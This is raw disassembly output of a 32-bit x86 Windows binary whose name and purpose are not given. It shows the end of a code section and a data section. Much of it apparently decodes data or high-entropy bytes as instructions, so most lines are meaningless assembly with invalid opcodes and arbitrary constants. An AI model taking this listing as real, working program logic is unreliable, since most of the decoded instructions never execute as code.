  4119bd:	test   eax,0xded7a9
  4119c2:	mov    cs,WORD PTR [esi-0x7b970df8]
  4119c8:	push   0xb87797e0
  4119cd:	inc    eax
  4119ce:	push   es
  4119cf:	inc    esi
  4119d0:	cmp    bl,bh
  4119d2:	mov    es,WORD PTR [esi]
  4119d4:	stc    
  4119d5:	and    DWORD PTR [eax-0x61],esp
  4119d8:	mov    ebx,DWORD PTR [di-0x15]
  4119dc:	in     eax,0xa4
  4119de:	dec    ebx
  4119df:	xchg   edx,eax
  4119e0:	call   DWORD PTR [ebx+0x52]
  4119e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119e4:	push   ecx
  4119e5:	and    bh,dl
  4119e7:	loop   0x4119f3
  4119e9:	call   0xf7f8753
  4119ee:	or     esp,DWORD PTR [ebp+0x298ba772]
  4119f4:	xor    edx,edx
  4119f6:	arpl   WORD PTR fs:[ebp+ebp*8-0x47],si
  4119fb:	or     dl,cl
  4119fd:	imul   esp,edi,0xf838c285
  411a03:	mov    esi,0x4a5f6e2c
  411a08:	adc    eax,0xf28f3fc7
  411a0d:	sbb    al,0x6f
  411a0f:	ror    DWORD PTR [edi-0x7e],cl
  411a12:	add    al,0x65
  411a14:	and    BYTE PTR [ecx+0x2b79ef6e],ah
  411a1a:	mov    bh,0xe5
  411a1c:	dec    DWORD PTR [ecx+0x53]
  411a1f:	and    DWORD PTR [edx],eax
  411a21:	test   al,0xce
  411a23:	sbb    DWORD PTR ds:0x4da5da9b,edi
  411a29:	mov    edx,0x8d1a8de2
  411a2e:	mov    dh,0x4f
  411a30:	sub    edi,esp
  411a32:	dec    ebx
  411a33:	test   al,0x14
  411a35:	xor    al,BYTE PTR [edx]
  411a37:	mov    ch,0x98
  411a39:	cmc    
  411a3a:	jmp    0xa188:0xf4674a0d
  411a41:	inc    ebp
  411a42:	adc    eax,0x7731c936
  411a47:	cmp    al,0x4
  411a49:	lods   eax,DWORD PTR ds:[esi]
  411a4a:	out    0x87,eax
  411a4c:	inc    ecx
  411a4d:	xchg   ecx,eax
  411a4e:	es dec esi
  411a50:	iret   
  411a51:	pop    ebp
  411a52:	mov    al,0xd9
  411a54:	adc    ebx,DWORD PTR [edi]
  411a56:	dec    esi
  411a57:	(bad)
  411a5b:	cmp    edi,DWORD PTR [edi+ebp*2-0x75]
  411a5f:	mov    ch,0xcf
  411a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a62:	ror    DWORD PTR [ecx-0x53c3c57e],cl
  411a68:	rcr    BYTE PTR [edx],0x7
  411a6b:	mov    ds:0x172b2498,al
  411a70:	das    
  411a71:	out    dx,eax
  411a72:	mov    ebp,0x19fb651e
  411a77:	aas    
  411a78:	mov    ebp,0x781a1ba6
  411a7d:	lock fs fadd st(4),st
  411a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a82:	(bad)  
  411a83:	xor    al,BYTE PTR [ebp-0x74]
  411a86:	sbb    BYTE PTR [edi+edi*2],bl
  411a89:	dec    esp
  411a8a:	mov    ebp,0x7964c7f0
  411a8f:	mul    BYTE PTR [edi]
  411a91:	jp     0x411a76
  411a93:	push   ebp
  411a94:	sub    eax,0xa9d83a63
  411a99:	aam    0x3d
  411a9b:	jne    0x411a85
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [ecx+edi*1+0x3],dl
  412427:	add    BYTE PTR [ecx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
